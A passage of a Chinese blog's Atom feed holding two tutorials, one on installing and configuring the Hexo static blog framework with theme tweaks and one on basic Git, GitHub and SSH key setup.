    <content type="html"><![CDATA[<p><img src="/2018/07/24/hexo-config/hexo-config-1.png" alt=""></p><h2 id="Hexo简介"><a href="#Hexo简介" class="headerlink" title="Hexo简介"></a>Hexo简介</h2><a id="more"></a><ul><li>hexo 一个快速简洁高效的博客框架，其基于Node.js的静态blog程序</li><li>作者是台湾的<a href="https://github.com/tommy351" target="_blank" rel="noopener">tommy351</a></li><li>什么？你问我为什么不用Wordpress？你猜。</li><li>采用第一种的弊端就是”Github Pages”禁了百度爬虫</li><li>呵！才不存在呢。我等小萌新没有影响的。<br><img src="hexo-config-2.jpg" alt=""></li></ul><h2 id="必要前提"><a href="#必要前提" class="headerlink" title="必要前提"></a>必要前提</h2><p>安装hexo前必须的程序</p><ul><li>Node.js</li><li>Git</li></ul><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo官方文档</a><br><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html" target="_blank" rel="noopener">Nodejs官方文档</a><br><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">Next官方文档</a></p><h2 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装nodejs</span></span><br><span class="line">$ sudo git <span class="built_in">clone</span> https://github.com/nodejs/node.git</span><br><span class="line">Cloning into <span class="string">'node'</span>...</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改目录权限：</span></span><br><span class="line">$ sudo chmod -R 755 node</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 ./configure 创建编译文件，并按照：</span></span><br><span class="line">$ <span class="built_in">cd</span> node</span><br><span class="line">$ sudo ./configure</span><br><span class="line">$ sudo make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看 node 版本：</span></span><br><span class="line">$ node --version</span><br><span class="line">v11.1.0</span><br></pre></td></tr></table></figure><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p><a href="/2018/07/24/git-config/">另一片文章</a></p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h2 id="创建网站文件"><a href="#创建网站文件" class="headerlink" title="创建网站文件"></a>创建网站文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir blog</span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">$ hexo init blog &amp;&amp; <span class="built_in">cd</span> blog</span><br></pre></td></tr></table></figure><h2 id="安装hexo插件"><a href="#安装hexo插件" class="headerlink" title="安装hexo插件"></a>安装hexo插件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br><span class="line">$ npm install hexo-asset-image --save</span><br><span class="line"><span class="comment"># Rss</span></span><br><span class="line">$ npm install hexo-generator-feed --save</span><br><span class="line"><span class="comment"># sitemap</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save</span><br><span class="line">$ npm install hexo-generator-baidu-sitemap --save</span><br><span class="line"></span><br><span class="line">$ npm install hexo-renderer-pug --save</span><br><span class="line">$ npm install hexo-renderer-sass --save</span><br><span class="line"><span class="comment">#搜索插件</span></span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line"><span class="comment"># 生成 SSH 公钥和密钥 默认生成在根目录的.ssh文件夹下 ~/.ssh</span></span><br><span class="line">$ ssh-keygen -t rsa </span><br><span class="line"><span class="comment"># 测试 (参数 -v 进入debug模式)</span></span><br><span class="line">$ ssh -t git@github.com </span><br><span class="line">$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><h2 id="网站配置文件"><a href="#网站配置文件" class="headerlink" title="网站配置文件"></a>网站配置文件</h2><ul><li>配置文件存储位置:blog/_config.yml<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration Hexo配置文件</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网站信息</span></span><br><span class="line"><span class="comment"># 标题</span></span><br><span class="line">title: Sherdh</span><br><span class="line"><span class="comment"># 副标题</span></span><br><span class="line">subtitle: 你看，那个人好奇怪哦！是啊，好像一条狗！</span><br><span class="line"><span class="comment"># 博客描述</span></span><br><span class="line">description: </span><br><span class="line"><span class="comment"># 作者昵称</span></span><br><span class="line">author: Sherdh</span><br><span class="line"><span class="comment"># 网站语言，默认英语，设置简体汉语</span></span><br><span class="line">language: zh-CN</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时区，默认电脑时区</span></span><br><span class="line">timezone: Asia/Shanghai</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网址设置</span></span><br><span class="line"><span class="comment"># 如果网站是放在子目录中，将url设置成'http://yoursite.com/child'，将root设置成'/child/'</span></span><br><span class="line"><span class="comment"># 网址</span></span><br><span class="line">url: https://sherdh.github.io</span><br><span class="line"><span class="comment"># 网站根目录。如果网站是放在子目录中，将root设置成'子目录名'</span></span><br><span class="line">root: /</span><br><span class="line"><span class="comment"># 文章链接地址格式 。即文章存放的目录。</span></span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录设置</span></span><br><span class="line"><span class="comment"># 资源文件夹，放在里面的文件会上传到github中</span></span><br><span class="line">source_dir: <span class="built_in">source</span></span><br><span class="line"><span class="comment"># 公共文件夹，存放生成的静态文件</span></span><br><span class="line">public_dir: public</span><br><span class="line"><span class="comment"># 标签文件夹，默认是tags。实际存放在source/tags中。</span></span><br><span class="line">tag_dir: tags</span><br><span class="line">rss_dir: rss</span><br><span class="line"><span class="comment"># 档案文件夹，默认是archives。</span></span><br><span class="line">archive_dir: archives</span><br><span class="line"><span class="comment"># 分类文件夹，默认是categories。实际存放在source/categories中。</span></span><br><span class="line">category_dir: categories</span><br><span class="line"><span class="comment"># 代码文件夹，默认是downloads/code</span></span><br><span class="line">code_dir: downloads/code</span><br><span class="line"><span class="comment"># 国际化文件夹，默认跟language相同</span></span><br><span class="line">i18n_dir: :lang</span><br><span class="line"><span class="comment"># 不需要渲染的文件夹或文件夹,放在[]中</span></span><br><span class="line"><span class="comment"># 这两个文件是百度和google的站长验证文件，不能渲染，否则会改变内容，不能验证过</span></span><br><span class="line">skip_render: [baidu_verify_R9MZjdMkXT.html, google0f8fac7da2b48ef8.html, README.md, 模板.md]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写作选项</span></span><br><span class="line"><span class="comment"># 新建博文（帖子）的默认名称</span></span><br><span class="line"><span class="comment"># File name of new posts</span></span><br><span class="line">new_post_name: :title.md </span><br><span class="line"><span class="comment"># 默认布局模板是post，而不是draft和page</span></span><br><span class="line">default_layout: post</span><br><span class="line"><span class="comment"># 是否将标题转换成标题形式（首字母大写）</span></span><br><span class="line">titlecase: <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="comment"># 在新标签页面中打开网页</span></span><br><span class="line">external_link: <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line">filename_case: 0</span><br><span class="line"><span class="comment"># 是否渲染草稿</span></span><br><span class="line">render_drafts: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 启动 Asset 文件夹</span></span><br><span class="line">post_asset_folder: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 把链接改为与根目录的相对位址</span></span><br><span class="line">relative_link: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 显示未来的文章</span></span><br><span class="line">future: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 代码块的设置</span></span><br><span class="line">highlight:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span>          <span class="comment">#  使用代码高亮</span></span><br><span class="line">  line_number: <span class="literal">true</span> <span class="comment"># 显示行号</span></span><br><span class="line">  auto_detect: <span class="literal">true</span>  <span class="comment"># 自动检测语言</span></span><br><span class="line">  tab_replace:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分类和标签</span></span><br><span class="line"><span class="comment"># 默认分类</span></span><br><span class="line">default_category: uncategorized</span><br><span class="line"><span class="comment"># 分类别名</span></span><br><span class="line">category_map:</span><br><span class="line"><span class="comment"># 标签别名</span></span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日期和时间格式</span></span><br><span class="line"><span class="comment"># Hexo 使用 Moment.js 来解析和显示时间。</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line">date_format: YYYY-MM-DD</span><br><span class="line">time_format: HH:mm:ss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分页配置</span></span><br><span class="line"><span class="comment"># ---------------下面选项需要对应插件的支持---------------</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-index --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-archive --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-category --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-tag --save</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="comment"># 每页显示的文章量 </span></span><br><span class="line"><span class="comment"># per_page: 20</span></span><br><span class="line"><span class="comment"># 首页的分页设置</span></span><br><span class="line">index_generator:</span><br><span class="line">  per_page: 5</span><br><span class="line"><span class="comment"># 归档页的分页设置</span></span><br><span class="line">archive_generator:</span><br><span class="line">  per_page: 30</span><br><span class="line">  yearly: <span class="literal">true</span></span><br><span class="line">  monthly: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 标签页的分页设置</span></span><br><span class="line">tag_generator:</span><br><span class="line">  per_page: 20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分页路径，在public中可以看到</span></span><br><span class="line"><span class="comment"># pagination_dir: page</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions 拓展插件配置</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line">plugins: </span><br><span class="line">baidusitemap: </span><br><span class="line">  path: baidusitemap.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置RSS</span></span><br><span class="line">feed: </span><br><span class="line">  <span class="comment"># feed 类型 (atom/rss2)</span></span><br><span class="line">  <span class="built_in">type</span>: atom   </span><br><span class="line">  <span class="comment"># rss 路径</span></span><br><span class="line">  path: atom.xml  </span><br><span class="line">  <span class="comment"># 在 rss 中最多生成的文章数(0显示所有)</span></span><br><span class="line">  <span class="built_in">limit</span>: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义站点内容搜索</span></span><br><span class="line"><span class="comment"># 需要先安装插件：</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-search --save</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  <span class="comment"># 如只想索引文章，可设置为post</span></span><br><span class="line">  field: all </span><br><span class="line"></span><br><span class="line"><span class="comment"># 主题配置</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line">theme: maupassant</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署配置</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment"># 部署到github</span></span><br><span class="line">  repository: git@github.com:sherdh/sherdh.github.io.git</span><br><span class="line">  <span class="comment"># 分支默认master</span></span><br><span class="line">  branch: maste</span><br></pre></td></tr></table></figure></li></ul><h2 id="主题美化"><a href="#主题美化" class="headerlink" title="主题美化"></a>主题美化</h2><h3 id="修改文章底部的那个带-号的标签"><a href="#修改文章底部的那个带-号的标签" class="headerlink" title="修改文章底部的那个带#号的标签"></a>修改文章底部的那个带#号的标签</h3><p>修改模板/themes/next/layout/_macro/post.swig<br>搜索 rel=”tag”&gt;#，将 # 换成 <code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p><h3 id="在每篇文章末尾统一添加“本文结束”标记"><a href="#在每篇文章末尾统一添加“本文结束”标记" class="headerlink" title="在每篇文章末尾统一添加“本文结束”标记"></a>在每篇文章末尾统一添加“本文结束”标记</h3><p>在路径 \themes\next\layout_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% <span class="keyword">if</span> not is_index %&#125;</span><br><span class="line">        &lt;div style=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;-------------本文结束,感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>接着打开\themes\next\layout_macro\post.swig文件<br>在post-body 之后， post-footer之前添加<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% <span class="keyword">if</span> not is_index %&#125;</span><br><span class="line">    &#123;% include <span class="string">'passage-end-tag.swig'</span> %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>然后在主题配置文件中最后加入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br></pre></td></tr></table></figure></p><h3 id="修改作者头像并旋转"><a href="#修改作者头像并旋转" class="headerlink" title="修改作者头像并旋转"></a>修改作者头像并旋转</h3><p>打开\themes\next\source\css_common\components\sidebar\sidebar-author.styl<br>在里面添加如下代码：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.site-author-image &#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  padding: <span class="variable">$site</span>-author-image-padding;</span><br><span class="line">  max-width: <span class="variable">$site</span>-author-image-width;</span><br><span class="line">  height: <span class="variable">$site</span>-author-image-height;</span><br><span class="line">  border: <span class="variable">$site</span>-author-image-border-width solid <span class="variable">$site</span>-author-image-border-color;</span><br><span class="line"></span><br><span class="line">  /* 头像圆形 */</span><br><span class="line">  border-radius: 80px;</span><br><span class="line">  -webkit-border-radius: 80px;</span><br><span class="line">  -moz-border-radius: 80px;</span><br><span class="line">  box-shadow: inset 0 -1px 0 <span class="comment">#333sf;</span></span><br><span class="line"></span><br><span class="line">  /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 </span><br><span class="line">    (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  /* 鼠标经过头像旋转360度 */</span><br><span class="line">  -webkit-transition: -webkit-transform 1.0s ease-out;</span><br><span class="line">  -moz-transition: -moz-transform 1.0s ease-out;</span><br><span class="line">  transition: transform 1.0s ease-out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">img:hover &#123;</span><br><span class="line">  /* 鼠标经过停止头像旋转 </span><br><span class="line">  -webkit-animation-play-state:paused;</span><br><span class="line">  animation-play-state:paused;*/</span><br><span class="line"></span><br><span class="line">  /* 鼠标经过头像旋转360度 */</span><br><span class="line">  -webkit-transform: rotateZ(360deg);</span><br><span class="line">  -moz-transform: rotateZ(360deg);</span><br><span class="line">  transform: rotateZ(360deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Z 轴旋转动画 */</span><br><span class="line">@-webkit-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@-moz-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -moz-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -moz-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="主页文章添加阴影效果"><a href="#主页文章添加阴影效果" class="headerlink" title="主页文章添加阴影效果"></a>主页文章添加阴影效果</h3><p>打开\themes\next\source\css_custom\custom.styl,向里面加入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 主页文章添加阴影效果</span><br><span class="line"> .post &#123;</span><br><span class="line">   margin-top: 60px;</span><br><span class="line">   margin-bottom: 60px;</span><br><span class="line">   padding: 25px;</span><br><span class="line">   -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">   -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://segmentfault.com/a/1190000009544924" target="_blank" rel="noopener">美化参考文章</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2018/07/24/hexo-config/hexo-config-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Hexo简介&quot;&gt;&lt;a href=&quot;#Hexo简介&quot; class=&quot;headerlink&quot; title=&quot;Hexo简介&quot;&gt;&lt;/a&gt;Hexo简介&lt;/h2&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0xp1n3.github.io/categories/Web/"/>
    
    
      <category term="hexo" scheme="https://0xp1n3.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>Git与Github食用方法</title>
    <link href="https://0xp1n3.github.io/2018/07/23/git-config/"/>
    <id>https://0xp1n3.github.io/2018/07/23/git-config/</id>
    <published>2018-07-24T02:19:01.000Z</published>
    <updated>2019-01-21T05:42:29.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2018/07/23/git-config/git-config-1.png" alt=""></p><h2 id="Git简介"><a href="#Git简介" class="headerlink" title="Git简介"></a>Git简介</h2><a id="more"></a><p>Git是目前最流行的版本管理系统，全球大多数的开源代码都是由Git管理的。<br>学会使用Git几乎成为了开发者的必备技能。<br>可以说，一旦你学会了Git，就很难离开Git了。</p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p>基于Git的一个开源社区，一个面向开源及私有软件项目的托管平台</p><ul><li><a href="https://github.com/" target="_blank" rel="noopener">Github</a></li><li><a href="https://git-scm.com" target="_blank" rel="noopener">Git</a></li></ul><h2 id="配置仓库"><a href="#配置仓库" class="headerlink" title="配置仓库"></a>配置仓库</h2><p>需要先在github注册用户<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"GitHub账号的名字"</span></span><br><span class="line">$ git config --global user.email <span class="string">"GitHub账号对应的邮箱"</span></span><br><span class="line"><span class="comment"># 配置好后可使用cat ~/.gitconfig命令查看</span></span><br><span class="line"></span><br><span class="line">初始化仓库</span><br><span class="line"></span><br><span class="line"><span class="comment">#ls -al 可以看到一个.git文件</span></span><br><span class="line">$ git init </span><br><span class="line">或</span><br><span class="line">$ git <span class="built_in">clone</span> url</span><br></pre></td></tr></table></figure></p><h2 id="基本食用"><a href="#基本食用" class="headerlink" title="基本食用"></a>基本食用</h2><p>创建文件后<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加入缓冲区</span></span><br><span class="line">$ git add 文件名</span><br><span class="line"><span class="comment"># 将文件从缓冲区提交到本地仓库</span></span><br><span class="line">$ git commit 文件名 -m <span class="string">"注释"</span></span><br><span class="line"><span class="comment"># 添加远程主机 origin是主机名 默认用origin</span></span><br><span class="line">$ git remote add origin github项目路径（如：https://github.com/sherdh/test.git）</span><br><span class="line"><span class="comment"># 同步你的本地仓库到github  (master 是分支名 默认为master)</span></span><br><span class="line">$ git push origin master</span><br><span class="line"></span><br><span class="line">分支</span><br><span class="line"></span><br><span class="line"><span class="comment">#（系统默认主分支是master）创建分支 无文件名即查看分支</span></span><br><span class="line">$ git branch 分支名</span><br><span class="line"><span class="comment"># 切换到其他分支</span></span><br><span class="line">$ git checkout 分支名</span><br><span class="line"><span class="comment"># 分支名 合并分支</span></span><br><span class="line">$ git merge -m “注释”</span><br><span class="line"><span class="comment"># 删除分支（只能删除已合并的分支）-D 强制删除分支</span></span><br><span class="line">$ git branch -d 分支名 </span><br><span class="line"><span class="comment"># 撤销分支合并</span></span><br><span class="line">$ git reset --hard HEAD^</span><br></pre></td></tr></table></figure></p><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> </span><br><span class="line">--<span class="built_in">stat</span> <span class="comment">#stat参数显示最详细</span></span><br><span class="line">--pretty=oneline <span class="comment">#单行显示</span></span><br><span class="line">--pretty=short <span class="comment">#简短显示</span></span><br><span class="line">--graph <span class="comment">#可视化提交图 画出提交历史线</span></span><br></pre></td></tr></table></figure><h2 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">安装ssh</span><br><span class="line">$ apt-get install ssh</span><br><span class="line"></span><br><span class="line">执行ssh-keygen命令</span><br><span class="line">$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/sherlock/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/sherlock/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/sherlock/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">xxxxxx</span><br><span class="line"></span><br><span class="line">密码其实不需要，直接回车就行了</span><br><span class="line">然后就默认在/home/.ssh下生成了两个文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line">~/.ssh$ ls</span><br><span class="line">id_rsaid_rsa.pub</span><br><span class="line"></span><br><span class="line">将公钥,即pub复制黏贴到github上setting的ssh and gpg keys上</span><br></pre></td></tr></table></figure><h2 id="测试ssh"><a href="#测试ssh" class="headerlink" title="测试ssh"></a>测试ssh</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">The authenticity of host <span class="string">'github.com (192.30.253.113)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is xxxxxx</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>github.com,192.30.253.113<span class="string">' (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Hi sherdh! You'</span>ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure><p>成功了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2018/07/23/git-config/git-config-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Git简介&quot;&gt;&lt;a href=&quot;#Git简介&quot; class=&quot;headerlink&quot; title=&quot;Git简介&quot;&gt;&lt;/a&gt;Git简介&lt;/h2&gt;
    
    </summary>
    
      <category term="杂七杂八" scheme="https://0xp1n3.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="github" scheme="https://0xp1n3.github.io/tags/github/"/>
    
      <category term="git" scheme="https://0xp1n3.github.io/tags/git/"/>
    
  </entry>
  
</feed>
